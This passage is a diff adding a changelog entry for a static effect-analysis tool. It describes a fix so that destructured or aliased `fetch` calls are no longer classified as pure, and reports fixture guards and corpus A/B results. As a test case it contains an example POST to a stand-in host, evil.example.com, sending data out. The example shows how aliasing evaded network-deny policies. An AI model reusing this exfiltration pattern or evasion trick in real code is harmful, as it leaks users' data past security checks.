@@ -8,6 +8,66 @@ report bytes or gate verdicts (regenerate baselines / expect verdict changes acr
 
 ## Unreleased
 
+- **⚠ CARDINAL-SIN FIX (SOUNDNESS R95) — `const { fetch } = globalThis; fetch(url)` was silently pure,
+  and so were three more spellings the alias unwrap cannot reach.** Measured at `0b360d4`, i.e. after
+  every earlier fix in this vein, and EXECUTED: all four forms were compiled and run against a localhost
+  listener, which logged a request from every one of them.
+
+      const { fetch } = globalThis;   fetch(u)      const { fetch: f } = globalThis;   f(u)
+      const g = globalThis;           g.fetch(u)    const a = [fetch];                 a[0](u)
+
+  Over `const { fetch } = globalThis; await fetch("https://evil.example.com/collect", {method:"POST",
+  body:data})`, **all six policy forms — `deny Net`, `deny Unknown`, `deny Net Unknown`, `pure`,
+  `deny Net in src`, `pure src` — answered exit 0, `policy ✓`, 0 effectful functions.**
+
+  Every guard in this classifier asks about the CALLEE — its node text, or the file its symbol is
+  declared in. A destructure binds `fetch` to a BindingElement *inside a project file*, which is exactly
+  what the shadow guard reads as "the project's own fetch", so the guard withheld `Net`. The alias
+  unwrap cannot help: it follows an identifier binding to its initializer NODE, and a destructure has no
+  identifier initializer to follow. The defect is that the callee is the wrong thing to ask about.
+
+  **`crypto` never had this hole, and the difference is the MECHANISM, not the effect** — its arms key on
+  the RESOLVED DECLARATION (the es-lib `parent === "Crypto"` arm, κ's `web-globals/crypto` rule), so a
+  destructured `crypto` still lands on `Crypto.randomUUID` and is charged `Rand`. The fix converges
+  `fetch` onto that: a new `resolvedIsHostFetch` predicate asks `getResolvedSignature` which function the
+  call reaches. All four spellings resolve to the *same* declaration, so one predicate closes all of them
+  instead of a fifth patch closing one.
+
+  **ADDITIVE.** The predicate is the LAST arm of the `else if` chain: every existing arm keeps priority,
+  so no call that is `Net` today can stop being `Net`, and the arm can only add `Net` to a call reported
+  pure. Four guards keep the fabrication direction at floor, each with a fixture that goes red when it is
+  deleted: the declaration must be an ambient (bodyless) `function fetch`; not in a project file (a
+  project's own `fetch` written with *overload signatures* is the shape that reaches this test); not
+  reached through a RELATIVE import (the module specifier decides, not file-set membership); and shaped
+  like the web API (`Promise<Response>`) — the same question the import arm already asks.
+
+  **The relative-import guard had this fix's own defect in it, caught before shipping** by asking the
+  guard the question the fix is about — does it key on a spelling where it should key on a binding. Its
+  first cut read `call.expression`, so it skipped every PropertyAccess callee and
+  `import * as shim from "./vendorshim"; shim.fetch(u)` **fabricated `Net` over the project's own shim**
+  while the named form one line up correctly gained nothing. It now reads the callee's HEAD identifier,
+  and the namespace spelling has its own fixture. The one guard with NO fixture is the `d.body` half of
+  (1): deleting it leaves all 1,784 rows green, so it is written down in the source as the scope
+  statement it is rather than as a guarantee.
+
+  **A/B, 10 corpora with `node_modules` installed** (axios, commander, express `--allow-js`, hono, rxjs,
+  typeorm, winston, zod, openai 7.8.0, @supabase/supabase-js 2.112.4), pre-image built from `0b360d4`'s
+  `scan.mjs`, keyed WIDE (all 16 report fields, not just `inferred`): **6,543 common rows, ADDED 0,
+  REMOVED 0, CHANGED 3** (2 of them on `inferred`). Hit counter in the changed branch: **3 hits across 2
+  of 10 corpora** (hono 1, supabase 2, every other corpus 0). hono's
+  `service-worker/handler.handle` — whose default option is literally
+  `fetch: globalThis.fetch.bind(globalThis)` — went `['Unknown']` → `['Net','Unknown']`, and
+  `deny Net src.adapter.service-worker.handler.handle` flipped **exit 0 → exit 1** on real third-party
+  code. supabase's `fetchWithAuth` moved `Net` from inherited to `direct`, `inferred` unchanged. Nothing
+  was removed anywhere, which is the structural consequence of the additive posture.
+
+  **What the corpus did NOT show, stated because it is the honest half:** the destructure spelling that
+  motivated this row has **zero** instances in those 10 corpora or in 13 packed HTTP/isomorphic packages
+  (ofetch, node-fetch-native, cross-fetch, ky, undici, @octokit/request, openai, supabase-js,
+  isomorphic-fetch, node-fetch, got, wretch, @vercel/fetch). All 3 real hits come from a different, also
+  correct shape: a slot declared `typeof fetch`. The A/B is therefore evidence about the OVER-CHARGE
+  direction, not about recall for the trigger.
+
 - **⚠ CARDINAL-SIN FIX (SOUNDNESS R103) — a call through a WRITABLE FUNCTION SLOT was judged as a call
   to that slot's INITIALIZER, so a class field bound to a function reference made its caller vanish.**
   The entire scan target was two lines — `function pureDefault(): string { return "pure"; }` /
